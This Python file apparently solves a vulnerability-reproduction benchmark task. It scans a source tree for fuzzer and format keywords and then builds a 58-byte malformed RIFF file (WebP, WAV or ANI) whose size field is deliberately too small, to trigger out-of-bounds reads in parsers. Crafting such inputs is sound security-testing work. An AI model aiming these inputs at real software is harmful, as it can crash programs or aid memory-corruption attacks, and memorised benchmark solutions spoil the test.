import os
import re
import tarfile
import struct
from collections import Counter
from typing import Optional


def _le32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _build_webp(total_len: int = 58) -> bytes:
    # RIFF size intentionally too small for the chunk payload, to trigger OOB reads
    riff_size = 16  # includes only 4 bytes of payload after chunk header within RIFF
    chunk_size = 10
    vp8x_payload = b"\x00" * 10
    data = b"RIFF" + _le32(riff_size) + b"WEBP" + b"VP8X" + _le32(chunk_size) + vp8x_payload
    if len(data) < total_len:
        data += b"\x00" * (total_len - len(data))
    return data[:total_len]


def _build_wave(total_len: int = 58) -> bytes:
    riff_size = 16  # includes only 4 bytes of fmt payload within RIFF
    fmt_size = 16
    # WAVEFORMATEX (PCM)
    fmt_payload = struct.pack("<HHIIHH", 1, 1, 8000, 16000, 2, 16)
    data = b"RIFF" + _le32(riff_size) + b"WAVE" + b"fmt " + _le32(fmt_size) + fmt_payload
    if len(data) < total_len:
        data += b"\x00" * (total_len - len(data))
    return data[:total_len]


def _build_ani(total_len: int = 58) -> bytes:
    riff_size = 16  # includes only 4 bytes of anih payload within RIFF
    anih_size = 36
    # ANIHEADER (9 DWORDs), cbSizeof must be 36
    anih_payload = struct.pack("<9I", 36, 1, 1, 1, 1, 32, 1, 1, 1)
    data = b"RIFF" + _le32(riff_size) + b"ACON" + b"anih" + _le32(anih_size) + anih_payload
    if len(data) < total_len:
        data += b"\x00" * (total_len - len(data))
    return data[:total_len]


def _iter_text_blobs_from_dir(root: str, max_total: int = 5_000_000, max_files: int = 500) -> list[str]:
    exts = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
        ".py", ".rs", ".java", ".js", ".ts", ".go", ".m", ".mm",
        ".txt", ".md", ".rst", ".cmake", ".bazel", ".bzl", ".gn", ".gni",
        ".sh", ".yml", ".yaml", ".toml", ".json", ".ini", ".cfg",
    }
    out = []
    total = 0
    files = 0
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if files >= max_files or total >= max_total:
                return out
            path = os.path.join(dirpath, fn)
            low = fn.lower()
            if low == "cmakelists.txt" or os.path.splitext(low)[1] in exts or "fuzz" in low or "fuzzer" in low:
                try:
                    sz = os.path.getsize(path)
                except OSError:
                    continue
                if sz <= 0 or sz > 600_000:
                    continue
                try:
                    with open(path, "rb") as f:
                        b = f.read(220_000)
                except OSError:
                    continue
                total += len(b)
                files += 1
                s = b.decode("latin1", errors="ignore")
                out.append(s)
    return out


def _iter_text_blobs_from_tar(tar_path: str, max_total: int = 5_000_000, max_files: int = 500) -> list[str]:
    exts = (
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
        ".py", ".rs", ".java", ".js", ".ts", ".go", ".m", ".mm",
        ".txt", ".md", ".rst", ".cmake", ".bazel", ".bzl", ".gn", ".gni",
        ".sh", ".yml", ".yaml", ".toml", ".json", ".ini", ".cfg",
    )

    out = []
    total = 0
    files = 0

    try:
        tf = tarfile.open(tar_path, "r:*")
    except Exception:
        return out

    try:
        members = tf.getmembers()
        prio = []
        other = []
        for m in members:
            if not m.isfile():
                continue
            name = m.name
            low = name.lower()
            if "fuzz" in low or "fuzzer" in low or "oss-fuzz" in low or "oss_fuzz" in low or "clusterfuzz" in low:
                prio.append(m)
            elif low.endswith(exts) or low.endswith("cmakelists.txt"):
                other.append(m)

        ordered = prio + other
        for m in ordered:
            if files >= max_files or total >= max_total:
                break
            if m.size <= 0 or m.size > 600_000:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                b = f.read(220_000)
            except Exception:
                continue
            total += len(b)
            files += 1
            s = b.decode("latin1", errors="ignore")
            out.append(s)
    finally:
        try:
            tf.close()
        except Exception:
            pass

    return out


def _score_format(texts: list[str]) -> str:
    scores = Counter()
    # weighting to prefer unique signatures
    for s in texts:
        if not s:
            continue
        up = s.upper()
        if ("RIFF" not in up) and ("FUZZ" not in up) and ("LLVMFUZZERTESTONEINPUT" not in up) and ("WAVE" not in up) and ("WEBP" not in up) and ("ACON" not in up) and ("ANIH" not in up):
            continue

        scores["riff"] += up.count("RIFF")

        scores["ani"] += 8 * up.count("ACON")
        scores["ani"] += 10 * up.count("ANIH")
        scores["ani"] += 4 * up.count(".ANI")
        scores["ani"] += 2 * up.count("ANIMATED CURSOR")
        scores["ani"] += 2 * up.count("CURSOR")

        scores["webp"] += 10 * up.count("WEBP")
        scores["webp"] += 6 * up.count("VP8X")
        scores["webp"] += 4 * up.count("VP8L")
        scores["webp"] += 3 * up.count("VP8 ")
        scores["webp"] += 4 * up.count("WEBPDECODE")
        scores["webp"] += 2 * up.count(".WEBP")

        scores["wave"] += 8 * up.count("WAVE")
        scores["wave"] += 6 * up.count("FMT ")
        scores["wave"] += 4 * up.count("DRWAV")
        scores["wave"] += 3 * up.count(".WAV")
        scores["wave"] += 2 * up.count("WAV")

    candidates = ["ani", "webp", "wave"]
    best = max(candidates, key=lambda k: (scores[k], scores["riff"]))
    if scores[best] == 0:
        # Default guess: many RIFF-related issues are in WebP/WAV/ANI; choose ANI due to given PoC length hint.
        return "ani"
    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts: list[str] = []
        if os.path.isdir(src_path):
            texts = _iter_text_blobs_from_dir(src_path)
        else:
            texts = _iter_text_blobs_from_tar(src_path)

        fmt = _score_format(texts)
        if fmt == "webp":
            return _build_webp(58)
        if fmt == "wave":
            return _build_wave(58)
        return _build_ani(58)